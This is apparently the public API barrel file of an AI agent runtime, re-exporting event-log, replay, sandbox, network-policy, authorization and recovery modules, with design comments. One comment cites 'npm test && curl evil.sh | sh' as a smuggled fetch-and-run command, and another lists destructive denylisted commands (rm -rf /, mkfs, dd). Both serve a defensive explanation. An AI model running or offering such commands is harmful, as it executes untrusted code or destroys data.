// Public API for @kernlbase/orion.
//
// This barrel is a DELIBERATE re-export surface, not a convenience dump. What it exposes is the
// API that already has a second consumer: `eval/` drives this runtime as a library across nine
// modules, so these boundaries have been exercised outside their own tests rather than designed
// speculatively.
//
// Deliberately NOT exported (reachable only via a subpath, or not at all):
//   core/projection  — bounded-window mechanics (ADR-001). Tuning, not contract.
//   core/lease       — operational; reached through the CLI (`orionctl reap`).
//   core/projection/compact — ON by default since Wave 3, but its mechanics are tuning, not
//                             contract. Compaction is observable through `context.compacted`
//                             events and configurable via the Worker's contextBudgetBytes.
//   agent/model/shims/*     — model-specific implementations. The shim *slot* is public
//                             (`shims: []` on createOpenAICompatModel); a given shim is not.
//   cli/             — a composition root, not a library.
//
// Anything not listed here is internal and may change without a major version bump.

// ── Run: durable execution state ────────────────────────────────────────────
// The event log itself. Store is append-only; a run is a first-class object you can re-open.
export { Store, uid, LeaseLostError } from './core/run/store.mjs';

// ── Event: the closed contract ──────────────────────────────────────────────
// EVENT_TYPES is frozen. isKnownType() rejects anything outside it, which is what makes the log
// a contract rather than opportunistic logging.
export {
  EVENT_TYPES, EVENT_CONTRACT_VERSION, isKnownType, TERMINAL, modelRespondedPayload, UnknownEventType,
} from './core/event/index.mjs';

// ── Trajectory: inspect, replay, fork ───────────────────────────────────────
// replay() reconstructs run state from the log with no model calls and no cost.
// fork() branches HISTORY — it does not rewind the workspace. See docs/FORKING.md.
export {
  replay, verifyProjectionEquivalence, fork, nearestTurnBoundary, rerun,
} from './core/replay/index.mjs';
export { explain, summarise, redact } from './core/run/explain.mjs';

// W5 E2: a stable, read-only view of a run as DATA (`summarise` renders the same facts as text).
//
// `project` itself stays private — see the note above; its bounded-window shape is tuning. But
// `eval/` legitimately needs turn counts, context sizes and the final status, and with no public
// accessor it deep-imported `project`, which made the "not exported" boundary decorative. This
// exports the need rather than the machinery. `stableDigest` comes with it because comparing two
// tool-call argument objects for identity is part of the same read-only analysis.
export { runSummary, stableDigest } from './core/projection/index.mjs';

// ── Planning (event contract v2) ────────────────────────────────────────────
// A plan is DERIVED: `projectPlan` folds plan.* events into the current plan. Nothing about a
// plan is stored, so it survives a crash and reconstructs identically under resume and replay.
export {
  projectPlan, readySteps, planSatisfied, summarisePlan,
} from './core/projection/plan.mjs';

// ── Artifacts (event contract v3) ───────────────────────────────────────────
// An artifact does not copy content: it is a hashed, provenance-bearing REFERENCE to the event
// that already holds the bytes. `resolveArtifact` follows that link and verifies the sha256.
export {
  projectArtifacts, resolveArtifact, describeArtifact, artifactId, summariseArtifact,
  qualifiesAsArtifact, ARTIFACT_MIN_BYTES,
  // Request provenance (Wave 4a): a digest and a host, never the request or the URL.
  requestDigest, endpointHost, stableStringify, redactSecrets,
} from './core/projection/artifacts.mjs';

// ── Providers (Wave 4a) ─────────────────────────────────────────────────────
// createProvider({kind}) is the seam: 'openai-compat' | 'anthropic'. Both normalise to ONE
// ModelResult, and quirks live in shims applied AFTER normalisation — so a shim written against
// ModelResult works for either provider. An unknown kind throws at construction, not at first call.
export {
  createProvider, PROVIDER_KINDS,
  createOpenAICompatModel, createAnthropicModel,
  toAnthropicRequest, fromAnthropicResponse,
  ModelError,
} from './agent/model/index.mjs';

// ── Streaming (event contract v4) ───────────────────────────────────────────
// Durable partial execution, not a rendering concern: deltas are recorded at a BOUNDED cadence
// and promote to artifacts, so a crash mid-stream leaves evidence and replay costs no model call.
export {
  createStreamAccumulator, sseEvents, decodeOpenAIChunk, DELTA_BYTES, DELTA_MS,
} from './agent/model/stream.mjs';

// ── Tools ───────────────────────────────────────────────────────────────────
// toolDefinitions() strips runtime-injected fields, so values the runtime owns (e.g. write's
// pre-state witness) are never exposed to — or supplied by — the model.
export { makeTools, toolDefinitions, validateArgs, ABSENT } from './agent/tools/index.mjs';

// ── Workspace ───────────────────────────────────────────────────────────────
// Path containment (including symlink escape) and bounded output. NOT OS-level isolation.
export {
  LocalSandbox, SandboxError, attachCheckpoints, scrubEnv,
  MAX_OUTPUT_BYTES, MAX_ERROR_BYTES, GREP_MAX_HITS,
} from './sandbox/local/index.mjs';

// ── Execution environment (Wave 6) ──────────────────────────────────────────
//
// The backend seam. `LocalSandbox` is #1 and honestly declares `isolation: 'none'` — path
// containment is a workspace scope, NOT OS isolation (plan §13). `ContainerSandbox` is #2 and is
// a real boundary: its own process tree and network stack, with the workspace BIND-MOUNTED so the
// ADR-011 witness and the git-shadow checkpoints keep working on the same bytes. That sharing is
// the Q4 reconciliation, and it is why the crash matrix reaches identical decisions under both.
export {
  Isolation, ISOLATED_LEVELS, describeCapabilities, assertBackendContract,
  REQUIRED_METHODS, REQUIRED_PROPERTIES,
} from './sandbox/backend.mjs';
export {
  ContainerSandbox, detectRuntime, pruneOrionContainers, CONTAINER_WORKSPACE, DEFAULT_IMAGE,
} from './sandbox/container/index.mjs';
// Default-deny egress. `hardBlockReason` is exported because the rules it enforces — link-local
// and cloud metadata — must hold in any policy a deployer writes, not just in this one.
export { createNetworkPolicy, hardBlockReason, networkFlagsFor, HARD_BLOCKED }
  from './sandbox/network.mjs';

// Posture is DERIVED from the backend's declared capability, never configured (W6-G). Exported
// so a deployer substituting the authorizer can reproduce the same derivation instead of
// reinventing — and so the "an override may only RAISE strictness" rule travels with it.
export { derivePosture, strictest, POSTURE_RANK } from './auth/posture.mjs';

// ── Resources: identity and lifecycle (Wave 6, Recovery 2.0) ────────────────
//
// The current binding is a FOLD over `resource.*` events, exactly as a plan is a fold over
// `plan.*` (plan §9.3). Deliberately NOT a mutable snapshot column: that is what the prior art
// does, and it would make a replayed run reconstruct a different binding than the original.
export {
  resolveResource, releaseResource, Resolution,
  resourceId, projectResources, bindingToReattach, ResourceKind, BindingState,
} from './core/resource/index.mjs';
export { summariseResources } from './core/projection/resource.mjs';

// ── Grants: approval memory (Wave 6-M) ──────────────────────────────────────
//
// G answers whether an action CAN be auto-allowed; this answers whether it ALREADY WAS approved
// and whether that still holds. Matching is a normalised EXACT command comparison, never a glob —
// `npm *` would make `npm test && curl evil.sh | sh` a pre-approved command.
export {
  GrantScope, describeGrant, projectGrants, grantCovers, findGrant, summariseGrants,
  normaliseCommand, projectKey, grantId,
} from './core/projection/grant.mjs';

// ── Authorization: the substitution seam ────────────────────────────────────
// authorize(action, context) -> allow | deny | escalate.
// A different authorizer plugs in here without a runtime change.
export { createAuthorizer, Decision, digestArgs } from './auth/default/index.mjs';

// ── Recovery ────────────────────────────────────────────────────────────────
// RecoveryClass is contract (tools declare one). classifyShell is an internal heuristic and is
// exported for inspection only — treat its exact verdicts as unstable.
// W5 T3: `isKnownDangerous` is exported too. It and `classifyShell` answer DIFFERENT questions,
// and that distinction is load-bearing — collapsing them is a standing non-goal:
//
//   classifyShell(cmd)     — how safely can this be RE-RUN after a crash? A default-deny
//                            recovery classification; an unrecognised command is UNSAFE.
//   isKnownDangerous(cmd)  — is this on the explicit denylist that no posture may authorize
//                            (rm -rf /, mkfs, dd to a device)? An explicit, enumerated set.
//
// A deployer writing an authorizer needs the second to reproduce the shipped hard denials; the
// first tells them nothing about that. It was reachable only by deep-importing `core/recovery`.
export { RecoveryClass, decideRecovery, classifyShell, isKnownDangerous } from './core/recovery/index.mjs';

// ── Worker: the run loop ────────────────────────────────────────────────────
export {
  Worker, ExitReason, repairOrphans,
  DEFAULT_SYSTEM, ESCALATION_POLICY, SYSTEM_WITH_ESCALATION_POLICY,
} from './agent/loop/worker.mjs';
